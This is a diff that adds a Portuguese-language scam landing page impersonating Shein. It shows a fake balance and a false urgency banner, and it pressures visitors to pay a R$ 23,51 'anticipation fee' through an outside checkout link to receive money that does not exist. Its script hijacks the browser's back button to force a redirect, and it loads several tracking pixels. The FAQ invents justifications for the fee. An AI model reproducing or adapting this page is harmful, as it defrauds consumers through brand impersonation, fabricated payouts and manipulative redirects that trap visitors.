@@ -1,0 +1,353 @@
+<!DOCTYPE html><html><head><script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+    // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
+    const link = '/upback4/';
+  
+    function setBackRedirect(url) {
+      let urlBackRedirect = url;
+      urlBackRedirect = urlBackRedirect =
+        urlBackRedirect.trim() +
+        (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+        document.location.search.replace('?', '').toString();
+  
+      history.pushState({}, '', location.href);
+      history.pushState({}, '', location.href);
+      history.pushState({}, '', location.href);
+  
+      window.addEventListener('popstate', () => {
+        console.log('onpopstate', urlBackRedirect);
+        setTimeout(() => {
+          location.href = urlBackRedirect;
+        }, 1);
+      });
+    }
+  
+    setBackRedirect(link);
+  </script>
+  
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "qf2wnn94bd");
+</script>
+<script>
+  (function() {
+    var n = document.createElement("script");
+    n.async = true;
+    n.src = "https://connect.facebook.net/en_US/fbevents.js";
+    document.head.appendChild(n);
+    n.onload = function() {
+      if (!window.fbq) {
+        window.fbq = function() {
+          window.fbq.callMethod
+            ? window.fbq.callMethod.apply(window.fbq, arguments)
+            : window.fbq.queue.push(arguments);
+        };
+        window.fbq.queue = [];
+        window.fbq.version = "2.0";
+        window.fbq.loaded = true;
+      }
+      fbq("init", "3843176725934968"); // Seu ID do Pixel
+      fbq("track", "PageView");
+    };
+  })();
+</script></head>
+<!-- Meta Pixel Code -->
+
+<body><noscript>
+  <img height="1" width="1" style="display:none" 
+       src="https://www.facebook.com/tr?id=3843176725934968&ev=PageView&noscript=1" />
+</noscript>
+<!-- End Meta Pixel Code -->
+<audio id="meuAudio">
+    <source src="media/dinheiro.mp3" type="audio/mp3">
+  </audio>
+<script>
+  window.pixelId = "67abdf9fa80dca37a31205b5";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shein - Antecipe seus ganhos</title>
+    <style>
+        /* Reset básico */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #f9f9f9;
+            color: #333;
+            margin: 0;
+            line-height: 1.6;
+        }
+
+        .top-bar {
+            background-color: black;
+            color: #fff;
+            text-align: center;
+            padding: 10px;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 20px;
+            background-color: white;
+            color: #fff;
+        }
+
+        .header img {
+            width: 100px;
+        }
+
+        .header .balance {
+            background-color: #fff;
+            color: black;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-weight: bold;
+        }
+
+        .main {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: calc(100vh - 140px);
+            padding: 20px;
+        }
+
+        .card {
+            background: #fff;
+            border: 1px solid #e0e0e0;
+            border-radius: 16px;
+            width: 100%;
+            max-width: 600px;
+            box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            padding: 30px 20px;
+        }
+
+        .card h1 {
+            font-size: 26px;
+            margin-bottom: 15px;
+            color: #333;
+        }
+
+        .card p {
+            font-size: 16px;
+            margin-bottom: 20px;
+            line-height: 1.8;
+        }
+
+        .card p span {
+            font-weight: bold;
+            color: black;
+        }
+
+        .button {
+            display: inline-block;
+            padding: 15px 25px;
+            background-color: black;
+            color: #fff;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            text-decoration: none;
+            margin: 20px 0;
+            transition: background-color 0.3s ease;
+        }
+
+        .button:hover {
+            background-color: #a00000;
+        }
+
+        .faq {
+            margin-top: 30px;
+            text-align: left;
+        }
+
+        .faq h2 {
+            font-size: 18px;
+            margin-bottom: 10px;
+            color: #333;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #e0e0e0;
+            padding: 10px 0;
+        }
+
+        .faq h2:hover {
+            color: black;
+        }
+
+        .faq p {
+            display: none;
+            font-size: 14px;
+            color: #555;
+            line-height: 1.5;
+            margin-top: 10px;
+        }
+
+        .faq p.active {
+            display: block;
+        }
+
+        .footer {
+            font-size: 14px;
+            color: #8e8e8e;
+            margin-top: 30px;
+            text-align: center;
+            padding: 20px;
+            background: #fff;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .footer a {
+            color: black;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .icon {
+            transform: rotate(0);
+            transition: transform 0.3s;
+        }
+
+        .icon.rotate {
+            transform: rotate(180deg);
+        }
+
+        .gif-container {
+            margin-bottom: 20px;
+        }
+
+        .gif-container img {
+            max-width: 50px;
+            height: auto;
+        }
+    </style>
+
+
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "qf2wnn94bd");
+    </script>
+    <div class="top-bar">
+        ATENÇÃO: CASO NÃO SAQUE O DINHEIRO DE IMEDIATO, ELE SERÁ ENVIADO PARA UM FUNDO DE DOAÇÃO E PERDERÁ 100% DO SALDO!
+    </div>
+
+    <header class="header">
+<img src="images/Shein-logo.png" alt="Logo do Santander">
+        <div class="balance">Saldo: R$ 516,49</div>
+    </header>
+
+    <main class="main">
+        <div class="card">
+            <div class="gif-container">
+            </div>
+
+            <h1>Saque solicitado com sucesso!</h1>
+            <p>Seu saque será enviado em <span>30 dias</span> para a <strong>CHAVE PIX CADASTRADA</strong>.</p>
+            <p>Quer receber <span>imediatamente</span>? Antecipe e receba o saque <span>IMEDIATAMENTE </span>por APENAS <span>R$ 23,51</span>.</p>
+
+            
+	<a class="fornpay_btn" href="https://go.disruptybr.com.br/69ahwnht8z">
+        QUERO ANTECIPAR SAQUE E RECEBER AGORA!
+    </a>
+    <style>
+        .fornpay_btn {
+            background: #000000;
+    background-image: -webkit-linear-gradient(top, #000000, #000000);
+    background-image: -moz-linear-gradient(top, #3d94f6, #1e62d0);
+    background-image: -ms-linear-gradient(top, #3d94f6, #1e62d0);
+    background-image: -o-linear-gradient(top, #3d94f6, #1e62d0);
+    background-image: -webkit-gradient(to bottom, #3d94f6, #1e62d0);
+    -webkit-border-radius: 10px;
+    -moz-border-radius: 10px;
+    border-radius: 10px;
+    color: #fff;
+    font-family: Arial;
+    font-size: 18px;
+    font-weight: 100;
+    padding: 10px 20px;
+    border: 1px solid #000000;
+    text-decoration: none;
+    display: block;
+    cursor: pointer;
+    text-align: center;
+        }
+
+        .fornpay_downsell {
+            color: #004faa;
+            font-family: Arial;
+            margin-top: 10px;
+            font-size: 16px!important;
+            font-weight: 100;
+            text-decoration: none;
+            display: block;
+            cursor: pointer;
+            text-align: center
+        }
+    </style>
+    <script src="js/oneclick.js"></script>
+	
+
+            <section class="faq" id="duvidas">
+                <h2>Por que tem essa taxa? <span class="icon">▼</span></h2>
+                <p>Todo aplicativo e plataforma tem um custo com servidores e para <span>MANUTENÇÃO</span> do APP. Essa taxa é um custo anual de acordo com nosso número de usuários.</p>
+
+                <h2>Se eu não pagar a taxa? <span class="icon">▼</span></h2>
+                <p>O cliente tem até o final do dia após o suporte entrar em contato para pagar. Caso não consiga, perderá sua vaga (<span>VAGA NÃO É REEMBOLSÁVEL</span>).</p>
+
+                <h2>O que acontece após eu pagar? <span class="icon">▼</span></h2>
+                <p>Automaticamente, o aplicativo será liberado e você poderá continuar avaliando e solicitando seu saque disponível.</p>
+            </section>
+
+            <p>Você pagou a <span>taxa de validação</span> que será <span>reembolsada</span> junto com seu saque de <span>R$ 492,98</span> dentro do aplicativo.<br>
+            Total a receber dentro do APP: <span>R$ 516,49</span></p>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <p>Shein, 2024. Todos os direitos reservados.</p>
+        <p><a href="#">Termos de uso e privacidade</a></p>
+    </footer>
+
+    <script>
+        const faqHeaders = document.querySelectorAll('.faq h2');
+
+        faqHeaders.forEach(header => {
+            header.addEventListener('click', () => {
+                const icon = header.querySelector('.icon');
+                const content = header.nextElementSibling;
+                content.classList.toggle('active');
+                icon.classList.toggle('rotate');
+            });
+        });
+    </script>
+
+
+</body></html>
